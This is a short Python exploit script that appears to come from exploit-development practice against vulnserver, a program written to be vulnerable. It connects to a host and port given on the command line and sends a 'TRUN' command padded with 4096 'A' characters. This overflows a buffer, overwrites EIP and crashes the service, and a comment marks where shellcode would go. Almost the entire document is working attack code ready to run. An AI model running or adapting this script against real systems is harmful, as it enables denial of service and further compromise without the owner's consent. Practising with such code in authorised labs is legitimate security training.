import os
import socket
import sys
if "-h" in sys.argv[:]:
    print("VULNSERVER DENIAL OF SERVICE")
    print("Usage: python DEV-BO-D001.py [host ip] ([port (default 9999)])")
    print("\nThis program leverages a Buffer Overflow vulnerability in vulnserver to overwrite EIP and cause the program to crash.")
    sys.exit(0)
host=sys.argv[1]
try:
    port=int(sys.argv[2]) #attempts to override port
except:
    port=9999 #If sys.argv[2] is unusable due to nonexistance, default to port 9999
a="A"*4096 #Set death string
exploit="TRUN /.:/"+str(a) #Generate exploit content. This is where shellcode would be loaded. 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.sendall(exploit) #Do not listen for return data, so that this program may be looped easily without hanging.
s.close()
